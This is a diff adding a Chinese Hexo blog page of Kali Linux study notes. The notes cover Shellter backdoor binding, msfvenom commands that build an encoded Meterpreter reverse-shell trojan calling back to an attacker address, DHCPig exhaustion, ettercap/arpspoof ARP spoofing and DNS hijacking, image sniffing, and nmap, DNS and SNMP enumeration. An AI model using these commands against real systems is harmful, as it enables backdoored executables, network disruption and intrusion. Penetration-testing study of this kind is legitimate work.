@@ -1,0 +1,1397 @@
+<!DOCTYPE html>
+
+
+<script type="text/javascript" color="0,0,255" opacity="0.7" zindex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+  <meta name="google-site-verification" content="KbsMGM-cxbXLL8_ZMgd9HoISLGQPx2GAvxaINp0qzhQ">
+
+
+
+
+
+
+
+
+  <meta name="baidu-site-verification" content="iHKOwnN4RR">
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.ico?v=5.1.4">
+
+
+
+
+
+
+
+  <meta name="keywords" content="渗透,Kali,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="shellter捆绑工具 Choose Operation Mode A(自动)/M(管理者，高级模式)/H(帮助)  PE Target：文件路径  Enable Stealth Mode 键入一个模板，输入Y，以隐形模式进入  选择连接方式">
+<meta name="keywords" content="渗透,Kali">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kali-Linux学习笔记-2">
+<meta property="og:url" content="http://www.lntro.xyz/Kali-Linux学习笔记-2/index.html">
+<meta property="og:site_name" content="风再起时">
+<meta property="og:description" content="shellter捆绑工具 Choose Operation Mode A(自动)/M(管理者，高级模式)/H(帮助)  PE Target：文件路径  Enable Stealth Mode 键入一个模板，输入Y，以隐形模式进入  选择连接方式">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-03-25T08:35:24.790Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Kali-Linux学习笔记-2">
+<meta name="twitter:description" content="shellter捆绑工具 Choose Operation Mode A(自动)/M(管理者，高级模式)/H(帮助)  PE Target：文件路径  Enable Stealth Mode 键入一个模板，输入Y，以隐形模式进入  选择连接方式">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.lntro.xyz/Kali-Linux学习笔记-2/">
+
+
+
+
+
+  <title>Kali-Linux学习笔记-2 | 风再起时</title>
+  <style>
+  .forkme{
+    display: none;
+  }
+  @media (min-width: 768px) {
+    .forkme{
+      display: inline;
+    }
+  }
+  </style>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?104760bf60098b3f7427cfbfb6fcefb6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+  <div class="forkme">
+    <a href="https://github.com/1ntro"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_gray_6d6d6d.png" alt="Fork me on GitHub"></a>
+  </div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">风再起时</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">你看，整片星空都是我的</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.lntro.xyz/Kali-Linux学习笔记-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Intro">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="https://raw.githubusercontent.com/1ntro/image/master/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="风再起时">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Kali-Linux学习笔记-2</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-10T11:32:11+08:00">
+                2018-06-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali-Linux/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali-Linux</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="shellter捆绑工具"><a href="#shellter捆绑工具" class="headerlink" title="shellter捆绑工具"></a>shellter捆绑工具</h2><ol>
+<li><p>Choose Operation Mode A(自动)/M(管理者，高级模式)/H(帮助)</p>
+</li>
+<li><p>PE Target：文件路径</p>
+</li>
+<li><p>Enable Stealth Mode 键入一个模板，输入Y，以隐形模式进入</p>
+</li>
+<li><p>选择连接方式</p>
+<a id="more"></a>
+
+<p>【1】Meterpreter_Revers_TCP：基于TCP的反向链接（谁触发这个模块，触发者的shell就会发送给指定的人）</p>
+<p>【2】Meterpreter_Reverse_HTTP：基于http网页传输的反向链接，和上面大同小异。</p>
+<p>【3】Meterpreter_Reverse_HTTPS：基于https网页传输的反向链接，即安全的HTTP传输连接。</p>
+<p>【4】Meterpreter_Bind_TCP：正向的链接，需要攻击者知道是谁触发的这个模块，类似后门程序</p>
+<p>【5】Shell_Reverse_Bind_TCP：反向链接，可以用shell直接接受会话</p>
+<p>【6】Shell_Bind_TCP：正向链接，可以用shell直接接受会话</p>
+<p>【7】WinExec：运行外部程序</p>
+</li>
+<li><p>配置主机地址和监听端口（port：65500）</p>
+</li>
+<li><p>生成含有后门的文件（Shllter_Backups 源文件的备份文件）</p>
+</li>
+</ol>
+<h2 id="msfvenom-生成木马"><a href="#msfvenom-生成木马" class="headerlink" title="msfvenom 生成木马"></a>msfvenom 生成木马</h2><p>-p –payload 有效载荷使用。指定一个有效的自定义载荷</p>
+<p>-l –list （| grep windows）列出一个模块类型（筛选windows)，通过grep和管道符的组合使用，可以进一步得出我们需要使用的载荷</p>
+<p>-f –format 输出格式</p>
+<p>-a –arch 使用的架构</p>
+<p>-i –iterations 编码有效负载的次数</p>
+<p>实例：</p>
+<p>msfvenom -p (有效攻击载荷) windows/meterpreter/reverse_tcp -e (使用编码器) x86/shikata_ga_nai -i (编码次数) 5 -b (特征码绕过) “\x00” lhost=10.0.0.128 lport=443 (攻击者ip和监听端口) -f (输出的格式) exe &gt; (输出成什么) payload.exe</p>
+<p>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b “\x00” lhost=192.168.112.147 lport=4444 -f exe &gt; text.exe</p>
+<h2 id="UPX-加壳工具"><a href="#UPX-加壳工具" class="headerlink" title="UPX 加壳工具"></a>UPX 加壳工具</h2><p>UPX加壳工具，大致理解为压缩，是重复的代码组合折叠在一起，减少文件的占用空间。</p>
+<p>-1 压缩更快</p>
+<p>-9 压缩更好</p>
+<p>-k 保存备份文件</p>
+<h2 id="DHCPig-增强DHCP耗竭攻击"><a href="#DHCPig-增强DHCP耗竭攻击" class="headerlink" title="DHCPig 增强DHCP耗竭攻击"></a>DHCPig 增强DHCP耗竭攻击</h2><p>DHCPig可以发起一个高级的DHCP耗尽攻击。它将消耗局域网内的所有IP地址以及阻止新客户端获取IP，同时它也防止旧客户端释放IP地址。另外，它会发送无效的ARP去把所有的windows主机震下线。</p>
+<p>pig.py [-h -v -6 -1 -s -f -t -a -i -o -l -x -y -z -g -r -n -c ] <interface><br>    -h, –help                     #显示帮助信息<br>    -v, –verbosity                #显示详细输出信息。（默认是10，范围是1-99<br>    -6, –ipv6                     #DHCPv6 (默认是关, 默认是开启DHCPv4)<br>    -1, –v6-rapid-commit          #开启RapidCommit (双向是被指定的，而不是4向。) (未开启)<br>    -s, –client-src               #客户端MAC地址列表。如00:11:22:33:44:55,00:11:22:33:44:56 (默认: 任意地址)<br>    -O, –request-options          #可选的请求编码，如 21,22,23 or 12,14-19,23 (默认: 0-80)<br>    -f, –fuzz                     #任意模糊包。 (未开启)<br>    -t, –threads                  #发送线程的数目。 (1)<br>    -a, –show-arp                 #检测/打印哪个主机有ARP请求 (未开启)<br>    -i, –show-icmp                #检测/打印ICMP请求 (未开启)<br>    -o, –show-options             #打印IP地址租赁信息。(未开启)<br>    -l, –show-lease-confirm       #检测/打印DHCP回复。 (未开启)<br>    -g, –neighbors-attack-garp    #使用无故的ARP去碰撞网络分段。 (未开启)<br>    -r, –neighbors-attack-release #释放所有的邻居IP (未开启)<br>    -n, –neighbors-scan-arp       #ARP邻居扫描 (未开启)<br>    -x, –timeout-threads          #线程生成计时器。 (0.4)<br>    -y, –timeout-dos              #DOS超时(8) (聚集grat.arp的等待时间)<br>    -z, –timeout-dhcprequest      #DHCP请求超时 (2)<br>    -c, –color                    #开启彩色输出(未开启)</interface></p>
+<p>实例：</p>
+<p>pig.py eth0<br>pig.py –show-options eth0<br>pig.py -x1 –show-options eth0<br>pig.py -6 –fuzz eth0<br>pig.py -6 -c -verbosity=100 eth0<br>pig.py –neighbors-scan-arp -r -g –show-options eth0</p>
+<h2 id="Ettercap"><a href="#Ettercap" class="headerlink" title="Ettercap"></a>Ettercap</h2><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>修改ettercap的操作权限 nano /etc/ettercap/etter.conf ec_uid = 0 、 ec_gid = 0</p>
+<p>防火墙设置</p>
+<p>ettercap -i eth0 -Tq -M arp:remote</p>
+<h3 id="ARP断网攻击"><a href="#ARP断网攻击" class="headerlink" title="ARP断网攻击"></a>ARP断网攻击</h3><p>Arpspoof [-i interface] (-c own|host|both) [-t -arget] (-r) host</p>
+<p>nbtscan -r (主机ip)/24查找当前局域网其他用户</p>
+<p>实例：arpspoof -i eth0 -t 192.168.112.146 192.168.112.2</p>
+<h3 id="信息嗅探"><a href="#信息嗅探" class="headerlink" title="信息嗅探"></a>信息嗅探</h3><h3 id="图片嗅探"><a href="#图片嗅探" class="headerlink" title="图片嗅探"></a>图片嗅探</h3><p>driftnet -i rth0 -b -a （从网络流量捕获图像）</p>
+<p>-i 监听网卡</p>
+<p>-b 声音提醒</p>
+<p>-a 保存图片</p>
+<p>-d 图片保存目录</p>
+<p>实例：driftnet -i rth0 -b -a -d /root/ls</p>
+<h3 id="DNS劫持"><a href="#DNS劫持" class="headerlink" title="DNS劫持"></a>DNS劫持</h3><p>修改配置文件： leafpad /etc/ettercap/etter.dns </p>
+<p>开启：ettercap -T -i eth0 -q -P dns_spoof /// /// </p>
+<h2 id="Nmap批量扫描"><a href="#Nmap批量扫描" class="headerlink" title="Nmap批量扫描"></a>Nmap批量扫描</h2><p>查看Nmap中的漏洞扫描脚本</p>
+<p>grep vuln /usr/share/nmap/scripts/script.db | cut -d “&quot;-f 2</p>
+<h2 id="DNS枚举工具"><a href="#DNS枚举工具" class="headerlink" title="DNS枚举工具"></a>DNS枚举工具</h2><h3 id="DNSenum"><a href="#DNSenum" class="headerlink" title="DNSenum"></a>DNSenum</h3><p>DNSenum是一款非常强大的域名信息收集工具。它能够通过谷歌或者字典文件猜测可能存在的域名，并对一个网段进行反向查询。它不仅可以查询网站的主机地址信息、域名服务器和邮件交换记录，还可以在域名服务器上执行axfr请求，然后通过谷歌脚本得到扩展域名信息，提取子域名并查询，最后计算C类地址并执行whois查询，执行反向查询，把地址段写入文件。<br>dnsenum  –enum baidu.com</p>
+<h3 id="fierce"><a href="#fierce" class="headerlink" title="fierce"></a>fierce</h3><p>fierce工具和DNSenum工具性质差不多，其fierce主要是对子域名进行扫描和收集信息的。使用fierce工具获取一个目标主机上所有IP地址和主机信息。<br>fierce -dns baidu.com</p>
+<h2 id="SNMP枚举工具（简单网络管理协议）"><a href="#SNMP枚举工具（简单网络管理协议）" class="headerlink" title="SNMP枚举工具（简单网络管理协议）"></a>SNMP枚举工具（简单网络管理协议）</h2><h3 id="snmpwalk"><a href="#snmpwalk" class="headerlink" title="snmpwalk"></a>snmpwalk</h3><p>Snmpwalk是一个SNMP应用程序。它使用SNMP的GETNEXT请求，查询指定的所有OID（SNMP协议中的对象标识）树信息，并显示给用户。<br>snmpwalk -c public 192.168.1.140 -v 2c</p>
+<p>###snmpcheck<br>Snmpcheck工具允许用户枚举SNMP设备的同时将结果以可读的方式输出。<br>snmp-check [host]<br>snmp-check -t 10 [host]</p>
+<h3 id="smtp-user-enum"><a href="#smtp-user-enum" class="headerlink" title="smtp-user-enum"></a>smtp-user-enum</h3><p>smtp-user-enum是针对SMTP服务器的25端口，进行用户名枚举的工具，用以探测服务器已存在的邮箱账户。</p>
+<h2 id="域名查询工具"><a href="#域名查询工具" class="headerlink" title="域名查询工具"></a>域名查询工具</h2><h3 id="DMitry"><a href="#DMitry" class="headerlink" title="DMitry"></a>DMitry</h3><p>DMitry工具是用来查询IP或域名WHOIS信息的。WHOIS是用来查询域名是否已经被注册及已经注册域名的详细信息的数据库（如域名所有人和域名注册商）。使用该工具可以查到域名的注册商和过期时间等。<br>dmitry -wnpb freebuf.com</p>
+<h3 id="netmask"><a href="#netmask" class="headerlink" title="netmask"></a>netmask</h3><p>netmask工具可以在IP范围、子网掩码、CIDR和Cisco等格式中互相转换，并且提供了IP地址的点分十进制、十六进制、八进制和二进制之间的互相转换。使用netmask工具将域名rzchina.net转换成标准的子网掩码格式。<br>netmask -s freebuf.com</p>
+<h2 id="跟踪路由工具"><a href="#跟踪路由工具" class="headerlink" title="跟踪路由工具"></a>跟踪路由工具</h2><h3 id="scapy"><a href="#scapy" class="headerlink" title="scapy"></a>scapy</h3><p>Scapy是一款强大的交互式数据包处理工具、数据包生成器、网络扫描器、网络发现工具和包嗅探工具。它提供多种类别的交互式生成数据包或数据包集合、对数据包进行操作、发送数据包、包嗅探、应答和反馈匹配等功能。</p>
+<h2 id="网络映射器工具"><a href="#网络映射器工具" class="headerlink" title="网络映射器工具"></a>网络映射器工具</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><p>Nmap是一个免费开放的网络扫描和嗅探工具包，也叫网络映射器（Network Mapper）。该工具其基本功能有三个，一是探测一组主机是否在线；其次是扫描主机端口，嗅探所提供的网络服务；三是可以推断主机所用的操作系统。通常，用户利用Nmap来进行网络系统安全的评估，而黑客则用于扫描网络。<br>Nmap使用TCP/IP协议栈指纹准确地判断目标主机的操作系统类型。首先，Nmap通过对目标主机进行端口扫描，找出有哪些端口正在目标主机上监听。当侦测到目标主机上有多于一个开放的TCP端口、一个关闭的TCP端口和一个关闭的UDP端口时，Nmap的探测能力是最好的。</p>
+<table>
+<thead>
+<tr>
+<th>测试</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>T1</td>
+<td>发送TCP数据包（Flag=SYN）到开放的TCP端口上</td>
+</tr>
+<tr>
+<td>T2</td>
+<td>发送一个空的TCP数据包到开放的TCP端口上</td>
+</tr>
+<tr>
+<td>T3</td>
+<td>发送TCP数据包（Flag=SYN、URG、PSH和FIN）到开放的TCP端口上</td>
+</tr>
+<tr>
+<td>T4</td>
+<td>发送TCP数据包（Flag=ACK）到开放的TCP端口上</td>
+</tr>
+<tr>
+<td>T5</td>
+<td>发送TCP数据包（Flag=SYN）到关闭的TCP端口上</td>
+</tr>
+<tr>
+<td>T6</td>
+<td>发送TCP数据包（Flag=ACK）到开放的TCP端口上</td>
+</tr>
+<tr>
+<td>T7</td>
+<td>发送TCP数据包（Flag=URG、PSH和FIN）到关闭的TCP端口上</td>
+</tr>
+</tbody></table>
+<p>使用Nmap识别活跃主机</p>
+<p><code>nmap -sP 192.168.1.140</code></p>
+<p>使用Nping查看获取更多详细信息</p>
+<p><code>nping --echo-client &quot;public&quot; echo.nmap.org</code></p>
+<p>输出的信息显示了与echo.nmap.org网站连接时数据的发送情况，如发送数据包的时间、接收时间、TTL值和往返时间等。</p>
+<p>发送一些十六进制数据到指定的端口</p>
+<p><code>nping -tcp -p 445 -data AF56A43D 192.168.41.136</code></p>
+<p>输出的信息显示了192.168.41.234与目标系统192.168.41.136之间TCP传输过程。通过发送数据包到指定端口模拟出一些常见的网络层攻击，以验证目标系统对这些测试的防御情况。</p>
+<h2 id="TCP端口扫描工具"><a href="#TCP端口扫描工具" class="headerlink" title="TCP端口扫描工具"></a>TCP端口扫描工具</h2><h3 id="Nmap-1"><a href="#Nmap-1" class="headerlink" title="Nmap"></a>Nmap</h3><p>查看目标主机192.168.41.136上开放的端口号</p>
+<p><code>nmap 192.168.1.140</code></p>
+<p>指定扫描端口范围</p>
+<p><code>nmap -p 1-1000 192.168.1.140</code></p>
+<p>扫描特定端口</p>
+<p><code>nmap -p 22 192.168.1.*</code></p>
+<h2 id="系统指纹识别"><a href="#系统指纹识别" class="headerlink" title="系统指纹识别"></a>系统指纹识别</h2><h3 id="Nmap-2"><a href="#Nmap-2" class="headerlink" title="Nmap"></a>Nmap</h3><p>使用Nmap的-O选项启用操作系统测试功能</p>
+<p><code>nmap -O 192.168.1.140</code></p>
+<h3 id="指纹识别工具p0f"><a href="#指纹识别工具p0f" class="headerlink" title="指纹识别工具p0f"></a>指纹识别工具p0f</h3><p>p0f是一款百分之百的被动指纹识别工具。该工具通过分析目标主机发出的数据包，对主机上的操作系统进行鉴别，即使是在系统上装有性能良好的防火墙也没有问题。</p>
+<h2 id="服务指纹识别"><a href="#服务指纹识别" class="headerlink" title="服务指纹识别"></a>服务指纹识别</h2><h3 id="Nmap-3"><a href="#Nmap-3" class="headerlink" title="Nmap"></a>Nmap</h3><p>查看服务上正在运行的端口</p>
+<p><code>nmap -sV 192.168.1.140</code></p>
+<h3 id="Amap"><a href="#Amap" class="headerlink" title="Amap"></a>Amap</h3><p>Amap是一个服务枚举工具。使用该工具能识别正运行在一个指定端口或一个范围端口上的应用程序。</p>
+<p>使用Amap工具在指定的50～100端口范围内主机正在运行的服务</p>
+<p><code>amap -bq 192.168.1.140 50-100</code></p>
+<h2 id="密码在线破解-暴力破解"><a href="#密码在线破解-暴力破解" class="headerlink" title="密码在线破解(暴力破解)"></a>密码在线破解(暴力破解)</h2><h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><p>Hydra是一个相当强大的暴力密码破解工具。该工具支持几乎所有协议的在线密码破解，如FTP、HTTP、HTTPS、MySQL、MS SQL、Oracle、Cisco、IMAP和VNC等。其密码能否被破解，关键在于字典是否足够强大。</p>
+<h3 id="Medusa"><a href="#Medusa" class="headerlink" title="Medusa"></a>Medusa</h3><p>Medusa工具是通过并行登录暴力破解的方法，尝试获取远程验证服务访问权限。</p>
+<h2 id="分析密码"><a href="#分析密码" class="headerlink" title="分析密码"></a>分析密码</h2><h3 id="MSFCONSOLE分析密码"><a href="#MSFCONSOLE分析密码" class="headerlink" title="MSFCONSOLE分析密码"></a>MSFCONSOLE分析密码</h3><p>使用Metasploit MSFCONSOLE的search_email_collector模块分析密码。通过该模块可以搜集一个组织相关的各种邮件信息。这些邮件信息有助于构建用户字典。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/gather/search_email_collector</span><br><span class="line">msf auxiliary(search_email_collector) &gt;</span><br><span class="line">msf auxiliary(search_email_collector) &gt; set DOMAIN gmail.com</span><br><span class="line">domain =&gt; gmail.com</span><br><span class="line">msf auxiliary(search_email_collector) &gt; set outfile /root/Desktop/fromwillie.txt</span><br><span class="line">outfile =&gt; /root/Desktop/fromwillie.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="哈希识别工具"><a href="#哈希识别工具" class="headerlink" title="哈希识别工具"></a>哈希识别工具</h3><p>hash-identifier</p>
+
+      
+    </div>
+    <div>
+      
+          <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">
+              -------------本文结束<i class="fa fa-paw"></i>感谢阅读-------------
+        </div>
+    
+</div>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>谢谢您请我吃糖~</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="https://raw.githubusercontent.com/1ntro/image/master/wechat.png" alt="Intro 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="https://raw.githubusercontent.com/1ntro/image/master/pay.png" alt="Intro 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags"> 
+		  
+ 		    <a href="/tags/渗透/" rel="tag"><i class="fa fa-tag"></i> 渗透</a> 
+		  
+ 		    <a href="/tags/Kali/" rel="tag"><i class="fa fa-tag"></i> Kali</a> 
+		   
+		</div>
+		
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/Kali-Linux学习笔记-1/" rel="next" title="Kali-Linux学习笔记-1">
+                <i class="fa fa-chevron-left"></i> Kali-Linux学习笔记-1
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/sqli-labs1-7学习笔记/" rel="prev" title="sqli-labs1-7学习笔记">
+                sqli-labs1-7学习笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80MTUxNS8xODA2Mg=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="https://raw.githubusercontent.com/1ntro/image/master/avatar.jpg" alt="Intro">
+            
+              <p class="site-author-name" itemprop="name">Intro</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">27</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://paper.seebug.org/" title="Seebug" target="_blank">Seebug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://github.com/CHYbeta/Web-Security-Learning" title="Web安全资源" target="_blank">Web安全资源</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.sec-wiki.com/skill/2" title="Web安全工程师" target="_blank">Web安全工程师</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
